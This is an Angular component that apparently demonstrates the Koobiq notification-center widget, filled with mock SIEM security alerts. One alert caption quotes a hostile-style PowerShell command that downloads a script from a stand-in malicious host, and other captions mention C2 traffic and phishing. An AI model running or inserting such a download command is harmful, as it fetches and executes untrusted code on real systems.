import { BreakpointObserver } from '@angular/cdk/layout';
import { AsyncPipe } from '@angular/common';
import {
    AfterViewInit,
    ChangeDetectionStrategy,
    Component,
    computed,
    inject,
    TemplateRef,
    ViewChild
} from '@angular/core';
import { takeUntilDestroyed, toSignal } from '@angular/core/rxjs-interop';
import { LuxonDateModule } from '@koobiq/angular-luxon-adapter/adapter';
import { KbqBadgeModule } from '@koobiq/components/badge';
import { KbqButtonModule, KbqButtonStyles } from '@koobiq/components/button';
import { KbqComponentColors, KbqFormattersModule, PopUpPlacements, ThemeService } from '@koobiq/components/core';
import { KbqDropdownModule } from '@koobiq/components/dropdown';
import { KbqIconModule } from '@koobiq/components/icon';
import { KbqLinkModule } from '@koobiq/components/link';
import { KbqNavbarModule } from '@koobiq/components/navbar';
import { KbqNotificationCenterModule, KbqNotificationCenterService } from '@koobiq/components/notification-center';
import { KbqToastStyle } from '@koobiq/components/toast';
import { of } from 'rxjs';
import { map } from 'rxjs/operators';

type ExampleAction = {
    id: string;
    icon?: string;
    text?: string;
    action?: () => void;
    style: KbqButtonStyles | string;
    color: KbqComponentColors;
};

enum NavbarIcItems {
    Assets,
    Issues,
    Incidents,
    Policies,
    Security
}

/**
 * @title notification-center
 */
@Component({
    selector: 'notification-center-push-example',
    imports: [
        KbqNotificationCenterModule,
        KbqNavbarModule,
        KbqBadgeModule,
        KbqIconModule,
        KbqButtonModule,
        KbqDropdownModule,
        AsyncPipe,
        KbqLinkModule,
        LuxonDateModule,
        KbqFormattersModule
    ],
    templateUrl: 'notification-center-push-example.html',
    styles: `
        ::ng-deep .example-notification-center-panel {
            margin-top: -139px;
        }
    `,
    changeDetection: ChangeDetectionStrategy.OnPush
})
export class NotificationCenterPushExample implements AfterViewInit {
    notificationService = inject(KbqNotificationCenterService);

    @ViewChild('actionsTemplate') actionsTemplateRef!: TemplateRef<any>;
    @ViewChild('captionTemplate') captionTemplateRef: TemplateRef<any>;

    protected readonly currentTheme = toSignal(
        inject(ThemeService, { optional: true })?.current.pipe(
            map((theme) => theme && theme.className.replace('kbq-', ''))
        ) || of('light'),
        { initialValue: 'light' }
    );

    protected readonly srcSet = computed(() => {
        const currentTheme = this.currentTheme();

        return `https://koobiq.io/assets/images/${currentTheme}/empty_192.png 1x, assets/images/${currentTheme}/empty_192@2x.png 2x`;
    });

    readonly isDesktop = toSignal(
        inject(BreakpointObserver)
            .observe('(min-width: 900px)')
            .pipe(
                takeUntilDestroyed(),
                map(({ matches }) => matches)
            ),
        { initialValue: true }
    );

    protected items = NavbarIcItems;
    protected selected: NavbarIcItems = NavbarIcItems.Assets;

    protected readonly actions: ExampleAction[] = [
        {
            id: '1',
            color: KbqComponentColors.Contrast,
            style: KbqButtonStyles.Filled,
            text: 'Primary Action'
        },
        {
            id: '2',
            color: KbqComponentColors.Contrast,
            style: KbqButtonStyles.Transparent,
            icon: 'kbq-ellipsis-horizontal_16'
        }
    ];

    protected readonly KbqComponentColors = KbqComponentColors;
    protected readonly KbqButtonStyles = KbqButtonStyles;
    protected readonly PopUpPlacements = PopUpPlacements;

    ngAfterViewInit() {
        this.notificationService.items = [
            {
                title: 'Security team successfully prevented major cyber attack',
                icon: true,
                date: '2025-10-03T10:30:00Z',
                style: KbqToastStyle.Success,
                caption: this.captionTemplateRef,
                actions: this.actionsTemplateRef
            },
            {
                title: 'Suspicious login detected from 192.168.1.45',
                icon: true,
                date: '2025-10-03T09:01:00Z',
                style: KbqToastStyle.Warning,
                caption: 'User admin attempted login from unusual location',
                actions: this.actionsTemplateRef
            },
            {
                title: 'High CPU usage on Server-DB-01',
                icon: true,
                date: '2025-10-03T09:10:00Z',
                style: KbqToastStyle.Warning,
                caption: 'Process **mysqld** exceeded 90% CPU',
                actions: this.actionsTemplateRef
            },
            {
                title: 'New rule triggered: Malware beaconing',
                icon: true,
                date: '2025-10-03T09:15:00Z',
                read: false,
                style: KbqToastStyle.Error,
                caption: 'Detected suspicious traffic to known C2 server'
            },
            {
                title: 'Critical: Unauthorized file access attempt',
                icon: true,
                date: '2025-10-02T23:45:00Z',
                style: KbqToastStyle.Error,
                actions: this.actionsTemplateRef,
                caption: this.captionTemplateRef
            },
            {
                title: 'New admin account created',
                icon: true,
                date: '2025-10-02T20:30:00Z',
                style: KbqToastStyle.Warning,
                caption: 'Account sec-admin was added',
                actions: this.actionsTemplateRef
            },
            {
                title: 'Firewall rule updated',
                icon: true,
                date: '2025-10-02T18:10:00Z',
                read: false,
                style: KbqToastStyle.Contrast,
                caption: 'Rule **Allow RDP** modified by ops-team'
            },
            {
                title: 'Failed login attempts exceeded threshold',
                icon: true,
                date: '2025-10-02T14:22:00Z',
                style: KbqToastStyle.Warning,
                caption: 'User john.doe failed 15 times',
                actions: this.actionsTemplateRef
            },
            {
                title: 'Vulnerability scan completed',
                icon: true,
                date: '2025-10-02T12:00:00Z',
                read: false,
                style: KbqToastStyle.Contrast,
                caption: 'Report available: Scan #884'
            },
            {
                title: 'Brute-force attack blocked',
                icon: true,
                date: '2025-10-01T23:50:00Z',
                style: KbqToastStyle.Warning,
                caption: 'IP 203.0.113.55 automatically blacklisted',
                actions: this.actionsTemplateRef
            },
            {
                title: 'SIEM correlation rule update applied',
                icon: true,
                date: '2025-10-01T20:15:00Z',
                read: false,
                style: KbqToastStyle.Contrast
            },
            {
                title: 'Critical: Ransomware pattern detected',
                icon: true,
                date: '2025-10-01T17:40:00Z',
                style: KbqToastStyle.Error,
                caption: 'Suspicious encryption on Server-FS-03',
                actions: this.actionsTemplateRef
            },
            {
                title: 'Backup job completed successfully',
                icon: true,
                date: '2025-10-01T06:15:00Z',
                read: false,
                style: KbqToastStyle.Success,
                caption: 'Job ID BKP-20251001-06'
            },
            {
                title: 'User password reset request',
                icon: true,
                date: '2025-09-30T23:59:00Z',
                style: KbqToastStyle.Contrast,
                caption: 'User alex.smith requested password reset'
            },
            {
                title: 'SIEM system update installed',
                icon: true,
                date: '2025-09-30T21:20:00Z',
                read: false,
                style: KbqToastStyle.Success
            },
            {
                title: 'Critical: Lateral movement detected',
                icon: true,
                date: '2025-09-30T19:05:00Z',
                style: KbqToastStyle.Error,
                caption: 'Suspicious Kerberos ticket use by srv-ops'
            },
            {
                title: 'Disk usage exceeded 90%',
                icon: true,
                date: '2025-09-30T13:45:00Z',
                read: false,
                style: KbqToastStyle.Warning,
                caption: 'Server-DB-02 partition **/var** almost full'
            },
            {
                title: 'New device connected: USB storage',
                icon: true,
                date: '2025-09-30T09:18:00Z',
                style: KbqToastStyle.Warning,
                caption: 'Device ID USB-7782 on workstation **PC-004**'
            },
            {
                title: 'Suspicious outbound traffic',
                icon: true,
                date: '2025-09-29T23:15:00Z',
                style: KbqToastStyle.Error,
                caption: 'Connection to blacklisted domain bad-domain.com'
            },
            {
                title: 'SIEM license will expire in 30 days',
                icon: true,
                date: '2025-09-29T21:10:00Z',
                read: false,
                style: KbqToastStyle.Warning,
                actions: this.actionsTemplateRef
            },
            {
                title: 'User added to privileged group',
                icon: true,
                date: '2025-09-29T18:40:00Z',
                style: KbqToastStyle.Warning,
                caption: 'mike.ross added to **Domain Admins**',
                actions: this.actionsTemplateRef
            },
            {
                title: 'Policy compliance scan started',
                icon: true,
                date: '2025-09-29T15:00:00Z',
                read: false,
                style: KbqToastStyle.Contrast
            },
            {
                title: 'Suspicious PowerShell command executed',
                icon: true,
                date: '2025-09-29T09:45:00Z',
                style: KbqToastStyle.Error,
                caption: 'Command: **Invoke-WebRequest -Uri http://malicious.example/file.ps1**'
            },
            {
                title: 'Email phishing attempt detected',
                icon: true,
                date: '2025-09-29T07:20:00Z',
                style: KbqToastStyle.Error,
                caption: 'Sender: attacker@phishmail.com',
                actions: this.actionsTemplateRef
            },
            {
                title: 'SIEM system health check passed',
                icon: true,
                date: '2025-09-28T22:30:00Z',
                read: false,
                style: KbqToastStyle.Success
            },
            {
                title: 'Unusual data transfer volume',
                icon: true,
                date: '2025-09-28T19:15:00Z',
                style: KbqToastStyle.Warning,
                caption: 'Workstation **PC-112** uploaded 8 GB in 10 min'
            },
            {
                title: 'Critical patch missing',
                icon: true,
                date: '2025-09-28T14:00:00Z',
                style: KbqToastStyle.Error,
                caption: 'Server-APP-09 missing MS patch KB500822'
            },
            {
                title: 'Account locked due to suspicious activity',
                icon: true,
                date: '2025-09-28T08:55:00Z',
                style: KbqToastStyle.Warning,
                caption: 'User linda.j locked after abnormal behavior',
                actions: this.actionsTemplateRef
            },
            {
                title: 'Low disk space resolved',
                icon: true,
                date: '2025-09-27T21:40:00Z',
                read: false,
                style: KbqToastStyle.Success,
                caption: 'Cleanup performed on Server-BCK-02'
            },
            {
                title: 'SIEM daily report generated',
                icon: true,
                date: '2025-09-27T08:00:00Z',
                read: false,
                style: KbqToastStyle.Contrast,
                caption: 'Report available: Daily #20250927',
                actions: this.actionsTemplateRef
            }
        ];
    }

    pushNotification() {
        this.notificationService.push({
            title: 'New notification',
            caption: 'New notification caption',
            icon: true,
            style: KbqToastStyle.Success,
            date: new Date().toISOString()
        });
    }
}
